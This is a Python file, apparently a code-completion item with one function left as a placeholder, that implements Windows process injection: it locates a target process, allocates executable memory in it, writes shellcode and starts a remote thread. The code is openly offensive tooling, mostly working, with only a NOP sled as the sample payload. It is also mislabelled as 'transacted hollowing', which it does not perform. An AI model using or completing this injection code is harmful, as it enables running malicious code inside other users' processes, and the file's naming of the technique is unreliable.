# transacted_hollowing.py

import ctypes
import os
import sys
from ctypes import wintypes

# Load the necessary Windows API functions
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

# Define the necessary structures and constants
PROCESS_ALL_ACCESS = 0x001F0FFF
TH32CS_SNAPPROCESS = 0x00000002
TH32CS_SNAPMODULE = 0x00000008

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", wintypes.PULONG),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.CHAR * 260)
    ]

class MODULEENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("th32ModuleID", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("GlblcntUsage", wintypes.DWORD),
        ("ProccntUsage", wintypes.DWORD),
        ("modBaseAddr", wintypes.LPVOID),
        ("modBaseSize", wintypes.DWORD),
        ("hModule", wintypes.HMODULE),
        ("szModule", wintypes.CHAR * 256),
        ("szExePath", wintypes.CHAR * 260)
    ]

# Function to get the process ID by name
def get_process_id_by_name(process_name):
    hSnapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if hSnapshot == -1:
        raise ctypes.WinError(ctypes.get_last_error())

    pe32 = PROCESSENTRY32()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)

    if not kernel32.Process32First(hSnapshot, ctypes.byref(pe32)):
        kernel32.CloseHandle(hSnapshot)
        raise ctypes.WinError(ctypes.get_last_error())

    while kernel32.Process32Next(hSnapshot, ctypes.byref(pe32)):
        if pe32.szExeFile.decode('utf-8') == process_name:
            kernel32.CloseHandle(hSnapshot)
            return pe32.th32ProcessID

    kernel32.CloseHandle(hSnapshot)
    return None

# Function to get the module base address by process ID and module name
def get_module_base_address(process_id, module_name):
    <FILL_HERE>
# Function to open a process with the specified access rights
def open_process(process_id, access_rights):
    hProcess = kernel32.OpenProcess(access_rights, False, process_id)
    if not hProcess:
        raise ctypes.WinError(ctypes.get_last_error())
    return hProcess

# Function to allocate memory in the target process
def allocate_memory(hProcess, size):
    addr = kernel32.VirtualAllocEx(hProcess, None, size, 0x1000 | 0x2000, 0x40)
    if not addr:
        raise ctypes.WinError(ctypes.get_last_error())
    return addr

# Function to write data to the allocated memory in the target process
def write_memory(hProcess, address, data):
    bytes_written = wintypes.SIZE_T()
    if not kernel32.WriteProcessMemory(hProcess, address, data, len(data), ctypes.byref(bytes_written)):
        raise ctypes.WinError(ctypes.get_last_error())
    return bytes_written.value

# Function to create a remote thread in the target process
def create_remote_thread(hProcess, start_address, parameter):
    hThread = kernel32.CreateRemoteThread(hProcess, None, 0, start_address, parameter, 0, None)
    if not hThread:
        raise ctypes.WinError(ctypes.get_last_error())
    return hThread

# Function to perform transacted hollowing
def transacted_hollowing(target_process_name, target_module_name, shellcode):
    # Get the process ID of the target process
    process_id = get_process_id_by_name(target_process_name)
    if not process_id:
        raise Exception(f"Process {target_process_name} not found.")

    # Open the target process
    hProcess = open_process(process_id, PROCESS_ALL_ACCESS)

    # Get the base address of the target module
    module_base_address = get_module_base_address(process_id, target_module_name)
    if not module_base_address:
        raise Exception(f"Module {target_module_name} not found in process {target_process_name}.")

    # Allocate memory for the shellcode in the target process
    shellcode_address = allocate_memory(hProcess, len(shellcode))

    # Write the shellcode to the allocated memory
    write_memory(hProcess, shellcode_address, shellcode)

    # Create a remote thread in the target process to execute the shellcode
    create_remote_thread(hProcess, shellcode_address, 0)

    print(f"Transacted hollowing successful. Shellcode executed in process {target_process_name}.")

# Example usage
if __name__ == "__main__":
    # Example shellcode (this should be replaced with actual shellcode)
    shellcode = b"\x90" * 100  # NOP sled for demonstration purposes

    # Perform transacted hollowing
    transacted_hollowing("notepad.exe", "notepad.exe", shellcode)